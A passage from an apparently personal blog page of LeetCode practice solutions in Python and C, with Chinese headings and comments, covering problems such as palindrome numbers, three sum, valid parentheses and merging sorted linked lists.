<span class="number">2147483647</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> int(res)</span><br><span class="line">        <span class="keyword">elif</span> s[<span class="number">0</span>] <span class="keyword">in</span> temp2:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(s)):</span><br><span class="line">                <span class="keyword">if</span> s[i] <span class="keyword">in</span> temp1:</span><br><span class="line">                    flag=<span class="number">0</span></span><br><span class="line">                    res += s[i]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> s[<span class="number">0</span>]==<span class="string">"-"</span>:</span><br><span class="line">                <span class="keyword">if</span> -int(res) - (<span class="number">-2147483648</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> -int(res)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-2147483648</span></span><br><span class="line">            <span class="keyword">elif</span> s[<span class="number">0</span>]==<span class="string">"+"</span>:</span><br><span class="line">                <span class="keyword">if</span> int(res) - <span class="number">2147483647</span> &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">2147483647</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> int(res)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="回文数-easy"><a href="#回文数-easy" class="headerlink" title="回文数(easy)"></a>回文数(easy)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k,t,sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">k=x;</span><br><span class="line"><span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">t=x%<span class="number">10</span>;</span><br><span class="line">sum=sum*<span class="number">10</span>+t;</span><br><span class="line">x=x/<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(sum==k)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="盛最多水的容器-medium"><a href="#盛最多水的容器-medium" class="headerlink" title="盛最多水的容器(medium)"></a>盛最多水的容器(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxArea</span><span class="params">(self, height)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type height: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        j=len(height)<span class="number">-1</span></span><br><span class="line">        res=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i&lt;j:</span><br><span class="line">            h=min(height[i],height[j])</span><br><span class="line">            res=max(res,h*(j-i))</span><br><span class="line">            <span class="keyword">if</span> height[i]&gt;height[j]:</span><br><span class="line">                j-=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="最长公共前缀-easy"><a href="#最长公共前缀-easy" class="headerlink" title="最长公共前缀(easy)"></a>最长公共前缀(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span><span class="params">(self, strs)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type strs: List[str]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(strs)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">        c=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(strs)):</span><br><span class="line">            c.append(len(strs[i]))</span><br><span class="line">        minl = min(c)</span><br><span class="line">        s=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(minl):</span><br><span class="line">            res=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(strs)):</span><br><span class="line">                res.append(strs[j][i])</span><br><span class="line">            <span class="keyword">if</span> res[<span class="number">1</span>:] == res[:<span class="number">-1</span>]:</span><br><span class="line">                s+=strs[j][i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><h4 id="三数之和-medium"><a href="#三数之和-medium" class="headerlink" title="三数之和(medium)"></a>三数之和(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSum</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#第一种方法，可行但超时</span></span><br><span class="line">        <span class="comment"># if len(nums)==0 or len(nums)==1 or len(nums)==2:</span></span><br><span class="line">        <span class="comment">#     return []</span></span><br><span class="line">        <span class="comment"># sum_two=[]</span></span><br><span class="line">        <span class="comment"># d=&#123;&#125;</span></span><br><span class="line">        <span class="comment"># res=[]</span></span><br><span class="line">        <span class="comment"># count=0</span></span><br><span class="line">        <span class="comment"># for i in range(len(nums)-1):</span></span><br><span class="line">        <span class="comment">#     for j in range(i+1,len(nums)):</span></span><br><span class="line">        <span class="comment">#         d[count]=[i,j]</span></span><br><span class="line">        <span class="comment">#         sum_two.append(nums[i]+nums[j])</span></span><br><span class="line">        <span class="comment">#         count+=1</span></span><br><span class="line">        <span class="comment"># # print(d)</span></span><br><span class="line">        <span class="comment"># # print(sum_two)</span></span><br><span class="line">        <span class="comment"># for i in range(len(nums)):</span></span><br><span class="line">        <span class="comment">#     for j in range(len(sum_two)):</span></span><br><span class="line">        <span class="comment">#         if i not in d[j] and nums[i]+sum_two[j]==0:</span></span><br><span class="line">        <span class="comment">#             temp = [nums[d[j][0]]] + [nums[i]] + [nums[d[j][1]]]</span></span><br><span class="line">        <span class="comment">#             temp.sort()</span></span><br><span class="line">        <span class="comment">#             if temp not in res:</span></span><br><span class="line">        <span class="comment">#                 res.append(temp)</span></span><br><span class="line">        <span class="comment"># # res = list(set([tuple(t) for t in res]))</span></span><br><span class="line">        <span class="comment"># # res = list([list(l) for l in res])</span></span><br><span class="line">        <span class="comment"># return res</span></span><br><span class="line"></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        <span class="comment"># n = len(nums)</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            d = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, len(nums)):</span><br><span class="line">                key = nums[j]</span><br><span class="line">                <span class="keyword">if</span> key <span class="keyword">in</span> d:</span><br><span class="line">                    value = d[key] + [key]</span><br><span class="line">                    value.sort()</span><br><span class="line">                    <span class="keyword">if</span> value <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                        res.append(value)</span><br><span class="line">                key = -nums[i] - nums[j]</span><br><span class="line">                <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">                    d[key] = [nums[i], nums[j]]</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="最接近的三数之和-medium"><a href="#最接近的三数之和-medium" class="headerlink" title="最接近的三数之和(medium)"></a>最接近的三数之和(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSumClosest</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res=[]</span><br><span class="line">        nums.sort()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            low=i+<span class="number">1</span></span><br><span class="line">            high=len(nums)<span class="number">-1</span></span><br><span class="line">            <span class="keyword">while</span> low&lt;high:</span><br><span class="line">                sums=nums[i]+nums[low]+nums[high]</span><br><span class="line">                res.append(sums)</span><br><span class="line">                <span class="keyword">if</span> sums==target:</span><br><span class="line">                    <span class="keyword">return</span> target</span><br><span class="line">                <span class="keyword">elif</span> sums&lt;target:</span><br><span class="line">                    low+=<span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    high-=<span class="number">1</span></span><br><span class="line">        res.sort()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> target&lt;=res[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">return</span> res[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> target&gt;=res[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> res[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">if</span> target <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">return</span> target</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(res)):</span><br><span class="line">            <span class="keyword">if</span> target&gt;res[i<span class="number">-1</span>] <span class="keyword">and</span> target&lt;res[i]:</span><br><span class="line">                a=target-res[i<span class="number">-1</span>]</span><br><span class="line">                b=res[i]-target</span><br><span class="line">                <span class="keyword">if</span> a&gt;b:</span><br><span class="line">                    <span class="keyword">return</span> res[i]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> res[i<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h4 id="有效的括号-easy"><a href="#有效的括号-easy" class="headerlink" title="有效的括号(easy)"></a>有效的括号(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        c=[]</span><br><span class="line">        j=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> s==<span class="string">''</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> s[<span class="number">0</span>]==<span class="string">')'</span> <span class="keyword">or</span> s[<span class="number">0</span>]==<span class="string">']'</span> <span class="keyword">or</span> s[<span class="number">0</span>]==<span class="string">'&#125;'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">            <span class="keyword">if</span> len(c)==<span class="number">0</span>:</span><br><span class="line">                c.append(s[i])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (c[<span class="number">-1</span>]==<span class="string">'('</span> <span class="keyword">and</span> s[i]==<span class="string">')'</span>) <span class="keyword">or</span> (c[<span class="number">-1</span>]==<span class="string">'['</span> <span class="keyword">and</span> s[i]==<span class="string">']'</span>)  <span class="keyword">or</span> (c[<span class="number">-1</span>]==<span class="string">'&#123;'</span> <span class="keyword">and</span> s[i]==<span class="string">'&#125;'</span>):</span><br><span class="line">                    c.pop(<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    c.append(s[i])</span><br><span class="line">        <span class="keyword">if</span> len(c)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="合并两个有序链表-easy"><a href="#合并两个有序链表-easy" class="headerlink" title="合并两个有序链表(easy)"></a>合并两个有序链表(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res=ListNode(<span class="literal">None</span>) <span class="comment">#合并之后的新数组</span></span><br><span class="line">        p=res <span class="comment">#保持头节点不动</span></span><br><span class="line">        <span class="keyword">if</span> l1==<span class="literal">None</span>:  </span><br><span class="line">            res.next=l2</span><br><span class="line">            <span class="keyword">return</span> res.next</span><br><span class="line">        <span class="keyword">if</span> l2==<span class="literal">None</span>:</span><br><span class="line">            res.next=l1</span><br><span class="line">            <span class="keyword">return</span> res.next</span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">and</span> l2:</span><br><span class="line">            <span class="keyword">if</span> l1.val &lt; l2.val:</span><br><span class="line">                p.next=l1</span><br><span class="line">                l1=l1.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p.next=l2</span><br><span class="line">                l2=l2.next</span><br><span class="line">            p=p.next</span><br><span class="line">        <span class="keyword">if</span> l1: <span class="comment">#如果l1还没循环结束</span></span><br><span class="line">            p.next=l1</span><br><span class="line">        <span class="keyword">else</span>: <span class="comment">#如果l2还没循环结束</span></span><br><span class="line">            p.next=l2</span><br><span class="line">        <span class="keyword">return</span> res.next</span><br></pre></td></tr></table></figure><h4 id="合并K个升序链表-hard"><a href="#合并K个升序链表-hard" class="headerlink" title="合并K个升序链表(hard)"></a>合并K个升序链表(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeKLists</span><span class="params">(self, lists)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type lists: List[ListNode]</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#如果lists为空，直接返回空</span></span><br><span class="line">        <span class="keyword">if</span> len(lists)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment">#temp用来存两个单链表合并后的结果</span></span><br><span class="line">        temp=ListNode()</span><br><span class="line">        temp.val=<span class="literal">None</span> <span class="comment">#将初始temp值置空</span></span><br><span class="line">        <span class="comment">#从第一个升序链表开始比较</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lists)):</span><br><span class="line">            <span class="comment">#保存temp和每一个升序链表比较后的结果</span></span><br><span class="line">            node=ListNode()</span><br><span class="line">            <span class="comment">#如果当前链表为空，直接将node指向temp，并开始比较下一个链表</span></span><br><span class="line">            <span class="keyword">if</span> lists[i]==<span class="literal">None</span>:</span><br><span class="line">                node.next=temp</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#如果temp为空，node指向当前链表并将temp指向node</span></span><br><span class="line">            <span class="keyword">if</span> temp==<span class="literal">None</span>:</span><br><span class="line">                node.next=lists[i]</span><br><span class="line">                temp=node.next</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#两个都不为空，需要一个保存node节点，所以使用head开始向后比较</span></span><br><span class="line">            head=node</span><br><span class="line">            <span class="keyword">while</span> temp !=<span class="literal">None</span> <span class="keyword">and</span> lists[i]!=<span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> temp.val&gt;lists[i].val:</span><br><span class="line">                    head.next=lists[i]</span><br><span class="line">                    head=head.next</span><br><span class="line">                    lists[i]=lists[i].next</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    head.next=temp</span><br><span class="line">                    head=head.next</span><br><span class="line">                    temp=temp.next</span><br><span class="line">            <span class="keyword">if</span> temp!=<span class="literal">None</span>:</span><br><span class="line">                head.next=temp</span><br><span class="line">            <span class="keyword">if</span> lists[i]!=<span class="literal">None</span>:</span><br><span class="line">                head.next=lists[i]</span><br><span class="line">            <span class="comment">#两个链表比较完毕后将temp重置，并开始下一轮的比较</span></span><br><span class="line">            temp=node.next</span><br><span class="line">        <span class="comment">#最后返回node节点</span></span><br><span class="line">        <span class="keyword">return</span> node.next.next</span><br></pre></td></tr></table></figure><h4 id="删除有序数组中的重复项-easy"><a href="#删除有序数组中的重复项-easy" class="headerlink" title="删除有序数组中的重复项(easy)"></a>删除有序数组中的重复项(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        c=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i]!=nums[c]:</span><br><span class="line">                nums[c+<span class="number">1</span>]=nums[i]</span><br><span class="line">                c+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> c+<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="搜索旋转排序数组-medium"><a href="#搜索旋转排序数组-medium" class="headerlink" title="搜索旋转排序数组(medium)"></a>搜索旋转排序数组(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> target <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">return</span> nums.index(target)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><h4 id="字符串相乘-medium"><a href="#字符串相乘-medium" class="headerlink" title="字符串相乘(medium)"></a>字符串相乘(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">multiply</span><span class="params">(self, num1, num2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num1: str</span></span><br><span class="line"><span class="string">        :type num2: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># return str(int(num1)*int(num2))</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(num1)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, len(num2)+<span class="number">1</span>):</span><br><span class="line">                res += int(num1[-i]) * int(num2[-j]) *<span class="number">10</span>**(i+j<span class="number">-2</span>)</span><br><span class="line">        <span class="keyword">return</span> str(res)</span><br></pre></td></tr></table></figure><h4 id="全排列-medium"><a href="#全排列-medium" class="headerlink" title="全排列(medium)"></a>全排列(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">trace</span><span class="params">(path,choice)</span>:</span></span><br><span class="line">            <span 